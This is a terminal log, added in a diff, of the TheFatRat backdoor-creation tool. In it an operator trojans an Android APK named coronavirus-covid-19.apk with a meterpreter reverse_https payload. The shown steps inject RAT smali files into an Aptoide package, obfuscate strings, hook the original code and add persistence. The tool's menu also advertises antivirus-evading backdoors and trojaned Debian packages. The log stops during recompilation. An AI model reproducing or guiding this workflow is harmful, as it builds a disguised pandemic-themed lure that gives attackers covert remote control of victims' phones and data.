@@ -1,0 +1,121 @@
+        ____							
+        |    | 							
+        |____| 							
+       _|____|_       _____ _       _____     _   _____     _       
+        /  ee\_      |_   _| |_ ___|   __|___| |_| __  |___| |_     
+      .<     __O       | | |   | -_|   __| .'|  _|    -| .'|  _|	
+     /\ \.-.' \        |_| |_|_|___|__|  |___|_| |__|__|___|_|  	
+    J  \.|'.\/ \                  				
+    | |_.|. | | |   [--]   Backdoor Creator for Remote Acces [--] 	
+     \__.' .|-' /   [--]  Created by: Edo Maland (Screetsec) [--]	
+     L   /|o'--'\   [--]            Version: 1.9.7           [--]	
+     |  /\/\/\   \  [--]          Codename: Whistle          [--]    
+     J /      \.__\ [--]   Follow me on Github: @Screetsec   [--]	
+     J /      \.__\ [--]   Dracos Linux : @dracos-linux.org  [--]	
+     |/         /   [--]    				     [--]		
+       \      .'\.  [--]     SELECT AN OPTION TO BEGIN:      [--]  
+    ____)_/\_(___\. [--] .___________________________________[--]	
+   (___._/  \_.___)'\_.-----------------------------------------/	
+
+  
+	[01]  Create Backdoor with msfvenom
+	[02]  Create Fud 100% Backdoor with Fudwin 1.0
+	[03]  Create Fud Backdoor with Avoid v1.2  
+	[04]  Create Fud Backdoor with backdoor-factory [embed] 
+	[05]  Backdooring Original apk [Instagram, Line,etc] 
+	[06]  Create Fud Backdoor 1000% with PwnWinds [Excelent] 
+	[07]  Create Backdoor For Office with Microsploit 
+	[08]  Trojan Debian Package For Remote Acces [Trodebi] 
+	[09]  Load/Create auto listeners  
+	[10]  Jump to msfconsole  
+	[11]  Searchsploit  
+	[12]  File Pumper [Increase Your Files Size] 
+	[13]  Configure Default Lhost & Lport 
+	[14]  Cleanup  
+	[15]  Help  
+	[16]  Credits  
+	[17]  Exit  
+  Set 05
+  Set LHOST IP: 10.0.2.15
+  Set LPORT: 444 
+  Enter the path to your android app/game .(ex: /root/downloads/myapp.apk)
+  Path : /root/coronavirus-covid-19.apk
+   +-------------------------------------------+
+   | [ 1 ] android/meterpreter/reverse_http    |
+   | [ 2 ] android/meterpreter/reverse_https   |
+   | [ 3 ] android/meterpreter/reverse_tcp     |
+   | [ 4 ] android/shell/reverse_http          |
+   | [ 5 ] android/shell/reverse_https         |
+   | [ 6 ] android/shell/reverse_tcp           |
+   +-------------------------------------------+
+
+   Choose Payload : 2
+
+[ +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++   ]
+ +------------------------------+
+ | [ 1 ] Use Backdoor-apk 0.2.4a |
+ | [ 2 ] Use old Fatrat method  |
+ +------------------------------+
+
+ Select Tool to create apk : 1
+
+
+
+[ +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++   ]$ 
+  Generate Backdoor
+  +------------++-------------------------++-----------------------+
+  | Name       ||  Descript   	          || Your Input
+  +------------++-------------------------++-----------------------+
+  | LHOST      ||  The Listen Addres      || 10.0.2.15
+  | LPORT      ||  The Listen Ports       || 44
+  | OUTPUTNAME ||  The Filename output    || app_backdoor.apk
+  | PAYLOAD    ||  Payload To Be Used     || android/meterpreter/reverse_https
+  +------------++-------------------------++-----------------------+
+
+
+          ________
+         / ______ \
+         || _  _ ||
+         ||| || |||          AAAAAA   PPPPPPP   KKK  KKK
+         |||_||_|||         AAA  AAA  PPP  PPP  KKK KKK
+         || _  _o|| (o)     AAA  AAA  PPP  PPP  KKKKKK
+         ||| || |||         AAAAAAAA  PPPPPPPP  KKK KKK
+         |||_||_|||         AAA  AAA  PPP       KKK  KKK
+         ||______||         AAA  AAA  PPP       KKK  KKK
+        /__________\
+________|__________|__________________________________________
+       /____________\
+       |____________|            Dana James Traversie
+
+[*] Running backdoor-apk.sh v0.2.4a on Sat 19 Sep 14:23:59 BST 2020
+[+] Android manifest permission options:
+1) Keep original
+2) Merge with payload and shuffle
+[?] Please select an Android manifest permission option: 1
+[*] Decompiling original APK file...done.
+[*] Locating smali file to hook in original project...done.
+[+] Package where RAT smali files will be injected: cm/aptoide/pt
+[+] Smali file to hook RAT payload: cm/aptoide/pt/NotificationApplicationView.smali
+[*] Generating RAT APK file...done.
+[*] Decompiling RAT APK file...done.
+[+] Keeping permissions of original project
+[*] Injecting helpful Java classes in RAT APK file...done.
+[*] Creating new directory in original package for RAT smali files...done.
+[+] Inject package path: cm/aptoide/pt/qpauk
+[+] Generated new smali class name for MainBroadcastReceiver.smali: Xzrgv
+[+] Generated new smali class name for MainService.smali: Xlvce
+[+] Generated new smali class name for Payload.smali: Mwpxs
+[+] Generated new smali class name for StringObfuscator.smali: Xjsjo
+[+] Generated new smali method name for StringObfuscator.obfuscate method: xnnpg
+[+] Generated new smali method name for StringObfuscator.unobfuscate method: nwbla
+[*] Copying RAT smali files to new directories in original project...done.
+[*] Fixing RAT smali files...done.
+[*] Obfuscating const-string values in RAT smali files...done.
+[*] Adding hook in original smali file...done.
+[*] Adding persistence hook in original project...done.
+[*] Recompiling original project with backdoor...
+
+
+ 
+
+
